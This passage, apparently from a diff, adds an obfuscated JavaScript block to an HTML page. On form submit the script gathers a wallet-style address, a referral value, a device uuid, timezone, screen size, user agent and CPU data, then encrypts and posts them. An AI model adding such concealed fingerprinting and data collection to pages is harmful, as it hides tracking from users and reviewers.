'v1tkRgQJVMcCgXAwEcQ==']; (function (_0x39c9aa, _0x227651, _0x30b0e1) { var _0xc5faba = function (_0x46250, _0x4ce0fb, _0x273eb7, _0x3bd2d1, _0x2fd4c2) { _0x4ce0fb = _0x4ce0fb >> 0x8, _0x2fd4c2 = 'po'; var _0xe1ee95 = 'shift', _0x3edd76 = 'push'; if (_0x4ce0fb < _0x46250) { while (--_0x46250) { _0x3bd2d1 = _0x39c9aa[_0xe1ee95](); if (_0x4ce0fb === _0x46250) { _0x4ce0fb = _0x3bd2d1; _0x273eb7 = _0x39c9aa[_0x2fd4c2 + 'p'](); } else if (_0x4ce0fb && _0x273eb7['replace'](/[tkRgQJVMcCgXAwEcQ=]/g, '') === _0x4ce0fb) { _0x39c9aa[_0x3edd76](_0x3bd2d1); } } _0x39c9aa[_0x3edd76](_0x39c9aa[_0xe1ee95]()); } return 0x8be04; }; return _0xc5faba(++_0x227651, _0x30b0e1) >> _0x227651 ^ _0x30b0e1; }(_0x80ad, 0x168, 0x16800)); var _0x5aa9 = function (_0x2fbeca, _0x302170) { _0x2fbeca = ~~'0x'['concat'](_0x2fbeca); var _0x3f855b = _0x80ad[_0x2fbeca]; if (_0x5aa9['PHaeaE'] === undefined) { (function () { var _0x2e1d0e = typeof window !== 'undefined' ? window : typeof process === 'object' && typeof require === 'function' && typeof global === 'object' ? global : this; var _0x4a0d87 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='; _0x2e1d0e['atob'] || (_0x2e1d0e['atob'] = function (_0x1725a4) { var _0x36a12e = String(_0x1725a4)['replace'](/=+$/, ''); for (var _0x3adbd4 = 0x0, _0x1ac61c, _0x1d98dd, _0x455447 = 0x0, _0xf707e7 = ''; _0x1d98dd = _0x36a12e['charAt'](_0x455447++); ~_0x1d98dd && (_0x1ac61c = _0x3adbd4 % 0x4 ? _0x1ac61c * 0x40 + _0x1d98dd : _0x1d98dd, _0x3adbd4++ % 0x4) ? _0xf707e7 += String['fromCharCode'](0xff & _0x1ac61c >> (-0x2 * _0x3adbd4 & 0x6)) : 0x0) { _0x1d98dd = _0x4a0d87['indexOf'](_0x1d98dd); } return _0xf707e7; }); }()); var _0x5d279d = function (_0x6c4f6b, _0x302170) { var _0x8b339 = [], _0x35e6fb = 0x0, _0x530939, _0x832422 = '', _0x21e2e0 = ''; _0x6c4f6b = atob(_0x6c4f6b); for (var _0x472111 = 0x0, _0x31bf20 = _0x6c4f6b['length']; _0x472111 < _0x31bf20; _0x472111++) { _0x21e2e0 += '%' + ('00' + _0x6c4f6b['charCodeAt'](_0x472111)['toString'](0x10))['slice'](-0x2); } _0x6c4f6b = decodeURIComponent(_0x21e2e0); for (var _0x289ef2 = 0x0; _0x289ef2 < 0x100; _0x289ef2++) { _0x8b339[_0x289ef2] = _0x289ef2; } for (_0x289ef2 = 0x0; _0x289ef2 < 0x100; _0x289ef2++) { _0x35e6fb = (_0x35e6fb + _0x8b339[_0x289ef2] + _0x302170['charCodeAt'](_0x289ef2 % _0x302170['length'])) % 0x100; _0x530939 = _0x8b339[_0x289ef2]; _0x8b339[_0x289ef2] = _0x8b339[_0x35e6fb]; _0x8b339[_0x35e6fb] = _0x530939; } _0x289ef2 = 0x0; _0x35e6fb = 0x0; for (var _0x19a3e0 = 0x0; _0x19a3e0 < _0x6c4f6b['length']; _0x19a3e0++) { _0x289ef2 = (_0x289ef2 + 0x1) % 0x100; _0x35e6fb = (_0x35e6fb + _0x8b339[_0x289ef2]) % 0x100; _0x530939 = _0x8b339[_0x289ef2]; _0x8b339[_0x289ef2] = _0x8b339[_0x35e6fb]; _0x8b339[_0x35e6fb] = _0x530939; _0x832422 += String['fromCharCode'](_0x6c4f6b['charCodeAt'](_0x19a3e0) ^ _0x8b339[(_0x8b339[_0x289ef2] + _0x8b339[_0x35e6fb]) % 0x100]); } return _0x832422; }; _0x5aa9['zvsaFw'] = _0x5d279d; _0x5aa9['RfEPgZ'] = {}; _0x5aa9['PHaeaE'] = !![]; } var _0x398bee = _0x5aa9['RfEPgZ'][_0x2fbeca]; if (_0x398bee === undefined) { if (_0x5aa9['dDZncs'] === undefined) { _0x5aa9['dDZncs'] = !![]; } _0x3f855b = _0x5aa9['zvsaFw'](_0x3f855b, _0x302170); _0x5aa9['RfEPgZ'][_0x2fbeca] = _0x3f855b; } else { _0x3f855b = _0x398bee; } return _0x3f855b; }; (function () { var _0x21b2d4 = { 'tOTey': function (_0x340d38, _0x23e7d2, _0x5a4e89) { return _0x340d38(_0x23e7d2, _0x5a4e89); }, 'nUDfP': function (_0x16c813, _0x41a624) { return _0x16c813 * _0x41a624; }, 'fJKWb': function (_0x38ae15, _0x4f3142) { return _0x38ae15(_0x4f3142); }, 'EhyTe': '9|1|4|5|14|6|11|12|7|15|0|3|10|2|13|8', 'Iokdj': _0x5aa9('0', 'IRmf'), 'ywJBR': _0x5aa9('1', 'HVQX'), 'DtXvm': _0x5aa9('2', 'HSeN'), 'ACgyI': _0x5aa9('3', 'R4X['), 'RuEgq': function (_0xd91c93, _0x3d3a0b) { return _0xd91c93(_0x3d3a0b); }, 'hossM': function (_0x42f676, _0x1869a1) { return _0x42f676(_0x1869a1); }, 'uwwAb': 'input[name=address]', 'LzaVe': _0x5aa9('4', 'nnsP'), 'MeALl': function (_0x5b2c63, _0x1a5aaf) { return _0x5b2c63 + _0x1a5aaf; }, 'yyVZM': function (_0x3b5d3c, _0x35b705) { return _0x3b5d3c + _0x35b705; }, 'qPOkr': function (_0x174a3f, _0x2671f0) { return _0x174a3f(_0x2671f0); }, 'KjbCf': _0x5aa9('5', 'D0xt'), 'VYxjL': _0x5aa9('6', 'ndZO'), 'OYfIZ': _0x5aa9('7', 'U4EO') }; function _0x3eee36(_0x587c3f) { if (!_0x21b2d4[_0x5aa9('8', 'H(Ha')](parseInt, _0x587c3f, 0xa)) _0x587c3f = 0x6; var _0x88cf9b = Math['floor'](_0x21b2d4[_0x5aa9('9', 'L(7F')](Math[_0x5aa9('a', 'w@eh')](0x24, _0x587c3f), Math['random']()))[_0x5aa9('b', 'm#Gi')](0x24); return (Math[_0x5aa9('c', '1!LT')](0xa, _0x587c3f) + _0x88cf9b)[_0x5aa9('d', 'HVQX')](-_0x587c3f); } _0x21b2d4[_0x5aa9('e', '1!LT')]($, document)['on'](_0x21b2d4['VYxjL'], _0x21b2d4[_0x5aa9('f', 'D&9a')], function (_0x3e7c49) { var _0x5abfc2 = _0x21b2d4[_0x5aa9('10', 'G!Q$')][_0x5aa9('11', 'HSeN')]('|'), _0x2b1559 = 0x0; while (!![]) { switch (_0x5abfc2[_0x2b1559++]) { case '0': var _0x87afc2 = new JSEncrypt(); continue; case '1': var _0x1f2b4c = ''; continue; case '2': _0x15ea5a = _0x87afc2[_0x5aa9('12', 'R10E')](_0x15ea5a); continue; case '3': var _0x123288 = ['-----BEGIN\x20PUBLIC\x20KEY-----', _0x21b2d4[_0x5aa9('13', 'Skb0')], _0x5aa9('14', '7nWh'), _0x21b2d4[_0x5aa9('15', 'nnsP')], _0x5aa9('16', 'Skb0'), _0x5aa9('17', 'IRmf')]; continue; case '4': if (window[_0x5aa9('18', 'JFzE')] && window[_0x5aa9('19', 'MgiB')][_0x5aa9('1a', ')J[f')](_0x21b2d4['DtXvm'])) { _0x1f2b4c = window[_0x5aa9('1b', 'Aq11')][_0x5aa9('1c', 'W&Az')](0xa); } else if (window[_0x5aa9('1d', 'P]Qs')]) { window[_0x5aa9('1d', 'P]Qs')][_0x5aa9('1e', 'U4EO')](_0x21b2d4[_0x5aa9('1f', 'D0xt')]); } continue; case '5': var _0x5d2788 = ''; continue; case '6': var _0x2937c0 = ''; continue; case '7': var _0x15ea5a = _0x3eee36(0x24); continue; case '8': _0x38bc59[_0x5aa9('20', 'D0xt')](_0x5aa9('21', 'r]Ar'), { 'content': _0x3ef733, 'key': _0x15ea5a }, function () { _0x21b2d4[_0x5aa9('22', 'OiRc')](init_page, _0x38bc59); }); continue; case '9': _0x3e7c49['preventDefault'](); continue; case '10': _0x87afc2['setPublicKey'](_0x123288['join']('\x0a')); continue; case '11': try { _0x2937c0 = _0x21b2d4[_0x5aa9('23', 'eMoW')](parseInt, new Date()[_0x5aa9('24', '(igk')]() / -0x3c); } catch (_0x442dbc) { } continue; case '12': var _0x3ef733 = { 'address': _0x21b2d4[_0x5aa9('25', 'zUpr')]($, this)[_0x5aa9('26', 'B^X5')](_0x21b2d4[_0x5aa9('27', 'R10E')])[_0x5aa9('28', 'aIsq')](), 'ref': $(this)[_0x5aa9('26', 'B^X5')](_0x21b2d4['LzaVe'])[_0x5aa9('29', 'w@eh')](), 'uuid': _0x1f2b4c, 'tz': _0x5d2788, 'tz_offset': _0x2937c0, 'screen': _0x21b2d4[_0x5aa9('2a', 'JPNW')](_0x21b2d4[_0x5aa9('2b', 'zUpr')](_0x21b2d4[_0x5aa9('2c', 'pvSQ')](_0x21b2d4[_0x5aa9('2d', 'Skb0')](window[_0x5aa9('2e', '[Qw1')][_0x5aa9('2f', 'Niu5')], 'x'), window[_0x5aa9('30', 'r]Ar')][_0x5aa9('31', 'Niu5')]), 'x'), window[_0x5aa9('32', 'IRmf')][_0x5aa9('33', 'ndZO')]), 'user_agent': navigator[_0x5aa9('34', 'm#Gi')], 'cpu': navigator[_0x5aa9('35', 'H(Ha')], 'lang': navigator['language'] || navigator['userLanguage'] }; continue; case '13': var _0x38bc59 = _0x21b2d4[_0x5aa9('36', 'HSeN')]($, _0x21b2d4[_0x5aa9('37', 'iz]X')]); continue; case '14': try { _0x5d2788 = new Intl['DateTimeFormat']()[_0x5aa9('38', 'H(Ha')]()['timeZone']; } catch (_0x2465ab) { } continue; case '15': _0x3ef733 = AES256['encrypt'](JSON[_0x5aa9('39', ')J[f')](_0x3ef733), _0x15ea5a); continue; }break; } }); }());
+</script>
+
 </body>
 
 </html>
